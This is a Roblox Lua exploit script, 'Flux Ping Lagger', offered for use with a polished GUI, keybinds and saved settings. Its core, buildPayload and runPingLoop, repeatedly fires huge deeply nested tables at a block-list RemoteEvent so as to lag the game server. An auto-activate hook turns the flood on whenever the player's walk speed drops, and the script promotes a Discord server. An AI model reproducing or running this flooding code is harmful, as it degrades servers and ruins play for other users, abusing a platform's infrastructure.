-- Bless Ping Lagger + Auto Activate (Flux Style - Final)
-- Open Asset : 80752529164731
-- Closed Asset: 124624013597906
-- AntiLag from Supreme.vs

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local Workspace        = game:GetService("Workspace")

local plr    = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local CONFIG_FILE = "BlessPingLagger_Config.json"

local DEFAULT_CFG = {
    power        = 100000,
    interval     = 0.125,
    keybindKb    = "F",
    keybindGp    = "ButtonY",
    autoActivate = true,
    antiLag      = false,
    uiSize       = 100,
}

local cfg = {
    power        = DEFAULT_CFG.power,
    interval     = DEFAULT_CFG.interval,
    keybindKb    = DEFAULT_CFG.keybindKb,
    keybindGp    = DEFAULT_CFG.keybindGp,
    autoActivate = DEFAULT_CFG.autoActivate,
    antiLag      = DEFAULT_CFG.antiLag,
    uiSize       = DEFAULT_CFG.uiSize,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end
    cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval     = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb    = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp    = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoActivate = type(data.autoActivate) == "boolean" and data.autoActivate or DEFAULT_CFG.autoActivate
    cfg.antiLag      = type(data.antiLag) == "boolean" and data.antiLag or DEFAULT_CFG.antiLag
    cfg.uiSize       = tonumber(data.uiSize) or DEFAULT_CFG.uiSize
end
loadConfig()

local active, listeningFor, remote = false, nil, nil
local brainrotMode, lastBrainrotState, manualOverride = false, false, false
local isMinimized = false
local antiLagEnabled = false
local antiLagDescConn = nil

local C = {
    white     = Color3.fromRGB(255,255,255),
    offWhite  = Color3.fromRGB(230,230,230),
    gray      = Color3.fromRGB(165,165,165),
    inputBg   = Color3.fromRGB(18,18,25),
    toggleOn  = Color3.fromRGB(60,255,110),
    toggleOff = Color3.fromRGB(45,45,55),
    red       = Color3.fromRGB(255,50,50),
    green     = Color3.fromRGB(60,255,110),
    yellow    = Color3.fromRGB(255,205,60),
}

for _, v in pairs(plrGui:GetChildren()) do
    if v.Name == "FluxPingLaggerGui" or v.Name == "BlessPingLaggerGui" then
        v:Destroy()
    end
end

local screen = Instance.new("ScreenGui")
screen.Name           = "FluxPingLaggerGui"
screen.ResetOnSpawn   = false
screen.DisplayOrder   = 25
screen.IgnoreGuiInset = true
screen.Parent         = plrGui

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.13, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick" or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape] = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown] = true,
}

local ASSET_OPEN   = "rbxthumb://type=Asset&id=80752529164731&w=768&h=432"
local ASSET_CLOSED = "rbxthumb://type=Asset&id=124624013597906&w=768&h=432"

local OPEN_W, OPEN_H     = 275, 435
local CLOSED_W, CLOSED_H = 280, 95

local function getScale()
    return math.clamp(cfg.uiSize / 100, 0.7, 1.35)
end

local mainFrame = Instance.new("ImageLabel")
mainFrame.Name                   = "MainFrame"
mainFrame.Size                   = UDim2.new(0, OPEN_W, 0, OPEN_H)
mainFrame.Position               = UDim2.new(0.5, -OPEN_W/2, 0.35, -OPEN_H/2)
mainFrame.BackgroundColor3       = Color3.fromRGB(6, 6, 10)
mainFrame.BackgroundTransparency = 0
mainFrame.Image                  = ASSET_OPEN
mainFrame.ScaleType              = Enum.ScaleType.Crop
mainFrame.Active                 = true
mainFrame.ClipsDescendants       = true
mainFrame.BorderSizePixel        = 0
mainFrame.Parent                 = screen

local cornerMask = Instance.new("UICorner")
cornerMask.CornerRadius = UDim.new(0, 16)
cornerMask.Parent = mainFrame

makeDraggable(mainFrame)

local content = Instance.new("Frame")
content.Name                   = "Content"
content.Size                   = UDim2.new(1, 0, 1, 0)
content.BackgroundTransparency = 1
content.Visible                = true
content.Parent                 = mainFrame

local title = Instance.new("TextLabel")
title.Size                   = UDim2.new(0.72, 0, 0, 20)
title.Position               = UDim2.new(0.055, 0, 0.025, 0)
title.BackgroundTransparency = 1
title.Text                   = "FLUX PING LAGGER"
title.TextColor3             = C.white
title.Font                   = Enum.Font.GothamBlack
title.TextSize               = 13
title.TextXAlignment         = Enum.TextXAlignment.Left
title.Parent                 = content

local minBtn = Instance.new("TextButton")
minBtn.Size                   = UDim2.new(0, 26, 0, 26)
minBtn.Position               = UDim2.new(1, -34, 0.020, 0)
minBtn.BackgroundColor3       = Color3.fromRGB(28,28,38)
minBtn.BackgroundTransparency = 0.3
minBtn.BorderSizePixel        = 0
minBtn.Text                   = "−"
minBtn.TextColor3             = C.white
minBtn.Font                   = Enum.Font.GothamBlack
minBtn.TextSize               = 18
minBtn.AutoButtonColor        = false
minBtn.ZIndex                 = 6
minBtn.Parent                 = content
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 7)

local uiLbl = Instance.new("TextLabel")
uiLbl.Size                   = UDim2.new(0.26, 0, 0, 15)
uiLbl.Position               = UDim2.new(0.055, 0, 0.085, 0)
uiLbl.BackgroundTransparency = 1
uiLbl.Text                   = "UI SIZE"
uiLbl.TextColor3             = C.offWhite
uiLbl.Font                   = Enum.Font.GothamBold
uiLbl.TextSize               = 11
uiLbl.TextXAlignment         = Enum.TextXAlignment.Left
uiLbl.Parent                 = content

local uiVal = Instance.new("TextLabel")
uiVal.Size                   = UDim2.new(0, 32, 0, 15)
uiVal.Position               = UDim2.new(0.33, 0, 0.085, 0)
uiVal.BackgroundTransparency = 1
uiVal.Text                   = tostring(cfg.uiSize)
uiVal.TextColor3             = C.white
uiVal.Font                   = Enum.Font.GothamBold
uiVal.TextSize               = 12
uiVal.Parent                 = content

local uiMinus = Instance.new("TextButton")
uiMinus.Size                   = UDim2.new(0, 24, 0, 24)
uiMinus.Position               = UDim2.new(0.48, 0, 0.078, 0)
uiMinus.BackgroundColor3       = Color3.fromRGB(32,32,45)
uiMinus.BackgroundTransparency = 0.2
uiMinus.BorderSizePixel        = 0
uiMinus.Text                   = "−"
uiMinus.TextColor3             = C.white
uiMinus.Font                   = Enum.Font.GothamBlack
uiMinus.TextSize               = 15
uiMinus.AutoButtonColor        = false
uiMinus.Parent                 = content
Instance.new("UICorner", uiMinus).CornerRadius = UDim.new(0, 6)

local uiPlus = Instance.new("TextButton")
uiPlus.Size                   = UDim2.new(0, 24, 0, 24)
uiPlus.Position               = UDim2.new(0.59, 0, 0.078, 0)
uiPlus.BackgroundColor3       = Color3.fromRGB(32,32,45)
uiPlus.BackgroundTransparency = 0.2
uiPlus.BorderSizePixel        = 0
uiPlus.Text                   = "+"
uiPlus.TextColor3             = C.white
uiPlus.Font                   = Enum.Font.GothamBlack
uiPlus.TextSize               = 15
uiPlus.AutoButtonColor        = false
uiPlus.Parent                 = content
Instance.new("UICorner", uiPlus).CornerRadius = UDim.new(0, 6)

local keyDisp = Instance.new("TextLabel")
keyDisp.Size                   = UDim2.new(0, 72, 0, 16)
keyDisp.Position               = UDim2.new(1, -105, 0.085, 0)
keyDisp.BackgroundTransparency = 1
keyDisp.Text                   = cfg.keybindGp ~= "None" and cfg.keybindGp or cfg.keybindKb
keyDisp.TextColor3             = C.yellow
keyDisp.Font                   = Enum.Font.GothamBold
keyDisp.TextSize               = 11
keyDisp.TextXAlignment         = Enum.TextXAlignment.Right
keyDisp.Parent                 = content

local disc = Instance.new("TextLabel")
disc.Size                   = UDim2.new(0.7, 0, 0, 13)
disc.Position               = UDim2.new(0.055, 0, 0.130, 0)
disc.BackgroundTransparency = 1
disc.Text                   = "discord.gg/fluxhub"
disc.TextColor3             = C.gray
disc.Font                   = Enum.Font.Gotham
disc.TextSize               = 10
disc.TextXAlignment         = Enum.TextXAlignment.Left
disc.Parent                 = content

local pLbl = Instance.new("TextLabel")
pLbl.Size                   = UDim2.new(0.4, 0, 0, 14)
pLbl.Position               = UDim2.new(0.055, 0, 0.175, 0)
pLbl.BackgroundTransparency = 1
pLbl.Text                   = "POWER"
pLbl.TextColor3             = C.offWhite
pLbl.Font                   = Enum.Font.GothamBold
pLbl.TextSize               = 11
pLbl.TextXAlignment         = Enum.TextXAlignment.Left
pLbl.Parent                 = content

local powerBox = Instance.new("TextBox")
powerBox.Size                   = UDim2.new(0.89, 0, 0, 32)
powerBox.Position               = UDim2.new(0.055, 0, 0.208, 0)
powerBox.BackgroundColor3       = C.inputBg
powerBox.BackgroundTransparency = 0.12
powerBox.BorderSizePixel        = 0
powerBox.Text                   = tostring(cfg.power)
powerBox.TextColor3             = C.white
powerBox.Font                   = Enum.Font.GothamBold
powerBox.TextSize               = 14
powerBox.ClearTextOnFocus       = false
powerBox.Parent                 = content
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 9)

local dLbl = Instance.new("TextLabel")
dLbl.Size                   = UDim2.new(0.4, 0, 0, 14)
dLbl.Position               = UDim2.new(0.055, 0, 0.300, 0)
dLbl.BackgroundTransparency = 1
dLbl.Text                   = "DELAY"
dLbl.TextColor3             = C.offWhite
dLbl.Font                   = Enum.Font.GothamBold
dLbl.TextSize               = 11
dLbl.TextXAlignment         = Enum.TextXAlignment.Left
dLbl.Parent                 = content

local delayBox = Instance.new("TextBox")
delayBox.Size                   = UDim2.new(0.89, 0, 0, 32)
delayBox.Position               = UDim2.new(0.055, 0, 0.333, 0)
delayBox.BackgroundColor3       = C.inputBg
delayBox.BackgroundTransparency = 0.12
delayBox.BorderSizePixel        = 0
delayBox.Text                   = tostring(cfg.interval)
delayBox.TextColor3             = C.white
delayBox.Font                   = Enum.Font.GothamBold
delayBox.TextSize               = 14
delayBox.ClearTextOnFocus       = false
delayBox.Parent                 = content
Instance.new("UICorner", delayBox).CornerRadius = UDim.new(0, 9)

local function makeToggle(y, text, initial, cb)
    local row = Instance.new("Frame")
    row.Size                   = UDim2.new(0.89, 0, 0, 28)
    row.Position               = UDim2.new(0.055, 0, y, 0)
    row.BackgroundTransparency = 1
    row.Parent                 = content

    local lbl = Instance.new("TextLabel")
    lbl.Size                   = UDim2.new(0.62, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text                   = text
    lbl.TextColor3             = C.offWhite
    lbl.Font                   = Enum.Font.GothamBold
    lbl.TextSize               = 12
    lbl.TextXAlignment         = Enum.TextXAlignment.Left
    lbl.Parent                 = row

    local track = Instance.new("Frame")
    track.Size                   = UDim2.new(0, 48, 0, 26)
    track.Position               = UDim2.new(1, -48, 0.5, -13)
    track.BackgroundColor3       = initial and C.toggleOn or C.toggleOff
    track.BorderSizePixel        = 0
    track.Parent                 = row
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame")
    knob.Size                   = UDim2.new(0, 22, 0, 22)
    knob.Position               = initial and UDim2.new(1, -24, 0.5, -11) or UDim2.new(0, 2, 0.5, -11)
    knob.BackgroundColor3       = C.white
    knob.BorderSizePixel        = 0
    knob.Parent                 = track
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local btn = Instance.new("TextButton")
    btn.Size                   = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text                   = ""
    btn.Parent                 = track

    local state = initial
    btn.MouseButton1Click:Connect(function()
        state = not state
        tw(track, {BackgroundColor3 = state and C.toggleOn or C.toggleOff}, 0.12)
        tw(knob, {Position = state and UDim2.new(1, -24, 0.5, -11) or UDim2.new(0, 2, 0.5, -11)}, 0.12)
        cb(state)
    end)

    return {
        set = function(v)
            state = v
            track.BackgroundColor3 = v and C.toggleOn or C.toggleOff
            knob.Position = v and UDim2.new(1, -24, 0.5, -11) or UDim2.new(0, 2, 0.5, -11)
        end
    }
end

local autoT = makeToggle(0.425, "AUTO ACTIVATE", cfg.autoActivate, function(v)
    cfg.autoActivate = v
    saveConfig()
end)

-- ANTILAG from Supreme.vs
local function applyAntiLagDerender(obj)
    pcall(function()
        if obj:IsA("BasePart") then
            obj.Material = Enum.Material.Plastic
            obj.Reflectance = 0
            obj.CastShadow = false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then
            obj.Transparency = 1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
            or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
            obj.Enabled = false
        elseif obj:IsA("AnimationController") or obj:IsA("Animator") then
            for _, t in ipairs(obj:GetPlayingAnimationTracks()) do
                pcall(function() t:Stop(0) end)
            end
        end
    end)
end

local function enableAntiLag()
    antiLagEnabled = true
    task.spawn(function()
        local descs = Workspace:GetDescendants()
        local i = 0
        local total = #descs
        while i < total and antiLagEnabled do
            for _ = 1, 200 do
                i = i + 1
                if i > total then break end
                applyAntiLagDerender(descs[i])
            end
            task.wait()
        end
    end)
    if antiLagDescConn then antiLagDescConn:Disconnect() end
    antiLagDescConn = Workspace.DescendantAdded:Connect(function(obj)
        if antiLagEnabled then applyAntiLagDerender(obj) end
    end)
end

local function disableAntiLag()
    antiLagEnabled = false
    if antiLagDescConn then
        antiLagDescConn:Disconnect()
        antiLagDescConn = nil
    end
end

local antiT = makeToggle(0.500, "ANTILAG", cfg.antiLag, function(v)
    cfg.antiLag = v
    saveConfig()
    if v then enableAntiLag() else disableAntiLag() end
end)

local bgLbl = Instance.new("TextLabel")
bgLbl.Size                   = UDim2.new(0.5, 0, 0, 14)
bgLbl.Position               = UDim2.new(0.055, 0, 0.575, 0)
bgLbl.BackgroundTransparency = 1
bgLbl.Text                   = "BACKGROUND"
bgLbl.TextColor3             = C.offWhite
bgLbl.Font                   = Enum.Font.GothamBold
bgLbl.TextSize               = 11
bgLbl.TextXAlignment         = Enum.TextXAlignment.Left
bgLbl.Parent                 = content

local bgBtn = Instance.new("TextButton")
bgBtn.Size                   = UDim2.new(0.89, 0, 0, 28)
bgBtn.Position               = UDim2.new(0.055, 0, 0.610, 0)
bgBtn.BackgroundColor3       = C.inputBg
bgBtn.BackgroundTransparency = 0.12
bgBtn.BorderSizePixel        = 0
bgBtn.Text                   = "  Default  ▼"
bgBtn.TextColor3             = C.white
bgBtn.Font                   = Enum.Font.Gotham
bgBtn.TextSize               = 12
bgBtn.TextXAlignment         = Enum.TextXAlignment.Left
bgBtn.AutoButtonColor        = false
bgBtn.Parent                 = content
Instance.new("UICorner", bgBtn).CornerRadius = UDim.new(0, 8)

local mainBtn = Instance.new("TextButton")
mainBtn.Size                   = UDim2.new(0.89, 0, 0, 44)
mainBtn.Position               = UDim2.new(0.055, 0, 0.700, 0)
mainBtn.BackgroundColor3       = Color3.fromRGB(30,30,40)
mainBtn.BackgroundTransparency = 0.08
mainBtn.BorderSizePixel        = 0
mainBtn.Text                   = "OFF"
mainBtn.TextColor3             = C.red
mainBtn.Font                   = Enum.Font.GothamBlack
mainBtn.TextSize               = 17
mainBtn.AutoButtonColor        = false
mainBtn.Parent                 = content
Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 11)
local mStroke = Instance.new("UIStroke", mainBtn)
mStroke.Color        = C.red
mStroke.Thickness    = 1.6
mStroke.Transparency = 0.15

local saveBtn = Instance.new("TextButton")
saveBtn.Size                   = UDim2.new(0.89, 0, 0, 32)
saveBtn.Position               = UDim2.new(0.055, 0, 0.830, 0)
saveBtn.BackgroundColor3       = Color3.fromRGB(28,28,38)
saveBtn.BackgroundTransparency = 0.12
saveBtn.BorderSizePixel        = 0
saveBtn.Text                   = "SAVE CONFIG"
saveBtn.TextColor3             = C.white
saveBtn.Font                   = Enum.Font.GothamBold
saveBtn.TextSize               = 13
saveBtn.AutoButtonColor        = false
saveBtn.Parent                 = content
Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 9)

local closed = Instance.new("Frame")
closed.Name                   = "ClosedContent"
closed.Size                   = UDim2.new(1, 0, 1, 0)
closed.BackgroundTransparency = 1
closed.Visible                = false
closed.Parent                 = mainFrame

local cTitle = Instance.new("TextLabel")
cTitle.Size                   = UDim2.new(0.70, 0, 0, 18)
cTitle.Position               = UDim2.new(0.05, 0, 0.15, 0)
cTitle.BackgroundTransparency = 1
cTitle.Text                   = "FLUX PING LAGGER"
cTitle.TextColor3             = C.white
cTitle.Font                   = Enum.Font.GothamBlack
cTitle.TextSize               = 12
cTitle.TextXAlignment         = Enum.TextXAlignment.Left
cTitle.Parent                 = closed

local cUi = Instance.new("TextLabel")
cUi.Size                   = UDim2.new(0.26, 0, 0, 14)
cUi.Position               = UDim2.new(0.05, 0, 0.46, 0)
cUi.BackgroundTransparency = 1
cUi.Text                   = "UI SIZE"
cUi.TextColor3             = C.offWhite
cUi.Font                   = Enum.Font.GothamBold
cUi.TextSize               = 10
cUi.TextXAlignment         = Enum.TextXAlignment.Left
cUi.Parent                 = closed

local cVal = Instance.new("TextLabel")
cVal.Size                   = UDim2.new(0, 30, 0, 14)
cVal.Position               = UDim2.new(0.32, 0, 0.46, 0)
cVal.BackgroundTransparency = 1
cVal.Text                   = tostring(cfg.uiSize)
cVal.TextColor3             = C.white
cVal.Font                   = Enum.Font.GothamBold
cVal.TextSize               = 11
cVal.Parent                 = closed

local cPlus = Instance.new("TextButton")
cPlus.Size                   = UDim2.new(0, 26, 0, 26)
cPlus.Position               = UDim2.new(1, -36, 0.14, 0)
cPlus.BackgroundColor3       = Color3.fromRGB(32,32,45)
cPlus.BackgroundTransparency = 0.25
cPlus.BorderSizePixel        = 0
cPlus.Text                   = "+"
cPlus.TextColor3             = C.white
cPlus.Font                   = Enum.Font.GothamBlack
cPlus.TextSize               = 16
cPlus.AutoButtonColor        = false
cPlus.ZIndex                 = 6
cPlus.Parent                 = closed
Instance.new("UICorner", cPlus).CornerRadius = UDim.new(0, 7)

local cDisc = Instance.new("TextLabel")
cDisc.Size                   = UDim2.new(0.6, 0, 0, 12)
cDisc.Position               = UDim2.new(0.05, 0, 0.70, 0)
cDisc.BackgroundTransparency = 1
cDisc.Text                   = "discord.gg/fluxhub"
cDisc.TextColor3             = C.gray
cDisc.Font                   = Enum.Font.Gotham
cDisc.TextSize               = 9
cDisc.TextXAlignment         = Enum.TextXAlignment.Left
cDisc.Parent                 = closed

local cKey = Instance.new("TextLabel")
cKey.Size                   = UDim2.new(0, 70, 0, 14)
cKey.Position               = UDim2.new(1, -100, 0.46, 0)
cKey.BackgroundTransparency = 1
cKey.Text                   = cfg.keybindGp ~= "None" and cfg.keybindGp or cfg.keybindKb
cKey.TextColor3             = C.yellow
cKey.Font                   = Enum.Font.GothamBold
cKey.TextSize               = 11
cKey.TextXAlignment         = Enum.TextXAlignment.Right
cKey.Parent                 = closed

local function applySize()
    local s = getScale()
    if isMinimized then
        mainFrame.Size = UDim2.new(0, CLOSED_W * s, 0, CLOSED_H * s)
    else
        mainFrame.Size = UDim2.new(0, OPEN_W * s, 0, OPEN_H * s)
    end
    uiVal.Text = tostring(cfg.uiSize)
    cVal.Text  = tostring(cfg.uiSize)
end

uiMinus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.max(65, cfg.uiSize - 5)
    applySize()
    saveConfig()
end)
uiPlus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.min(145, cfg.uiSize + 5)
    applySize()
    saveConfig()
end)

local function setMin(state)
    isMinimized = state
    if state then
        mainFrame.Image = ASSET_CLOSED
        content.Visible = false
        closed.Visible  = true
    else
        mainFrame.Image = ASSET_OPEN
        content.Visible = true
        closed.Visible  = false
    end
    applySize()
end

minBtn.MouseButton1Click:Connect(function() setMin(true) end)
cPlus.MouseButton1Click:Connect(function() setMin(false) end)

powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    if n then
        cfg.power = math.max(1, math.floor(n))
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text)
    if n then
        cfg.interval = math.max(0.01, n)
        delayBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

saveBtn.MouseButton1Click:Connect(function()
    saveConfig()
    local old = saveBtn.Text
    saveBtn.Text = "SAVED!"
    task.delay(0.7, function() if saveBtn then saveBtn.Text = old end end)
end)

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then return r end
    end
    for _, c in ipairs(rrs:GetChildren()) do
        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
    end
    return nil
end
remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do table.insert(main, nested) end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function updateBtn()
    if active then
        mainBtn.Text = "ON"
        mainBtn.TextColor3 = C.green
        mStroke.Color = C.green
    else
        mainBtn.Text = "OFF"
        mainBtn.TextColor3 = C.red
        mStroke.Color = C.red
    end
end

local function flipLag(state, isManual)
    active = state
    if isManual then
        if brainrotMode then manualOverride = not state else manualOverride = false end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then active = false updateBtn() return end
        end
        task.spawn(runPingLoop)
    end
    updateBtn()
end

mainBtn.MouseButton1Click:Connect(function() flipLag(not active, true) end)

RunService.Heartbeat:Connect(function()
    if not cfg.autoActivate then
        if brainrotMode then brainrotMode = false lastBrainrotState = false end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local has = hum.WalkSpeed < 25
    if has and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not has and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

local function updKey()
    local t = (cfg.keybindGp and cfg.keybindGp ~= "None") and cfg.keybindGp or cfg.keybindKb or "None"
    keyDisp.Text = t
    cKey.Text = t
end

UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then listeningFor = nil updKey() return end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor = nil
            updKey()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor = nil
            updKey()
            saveConfig()
            return
        end
        return
    end

    if processed then return end
    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end

    local kbE = resolveKb(cfg.keybindKb)
    local gpE = resolveKb(cfg.keybindGp)
    if (kbE and kc == kbE and isKb) or (gpE and kc == gpE and isGp) then
        flipLag(not active, true)
    end
end)

applySize()
updKey()
updateBtn()
autoT.set(cfg.autoActivate)
antiT.set(cfg.antiLag)
if cfg.antiLag then enableAntiLag() end

print("[Flux Ping Lagger] Final | Open 80752529164731 | Closed 124624013597906 | AntiLag from Supreme")
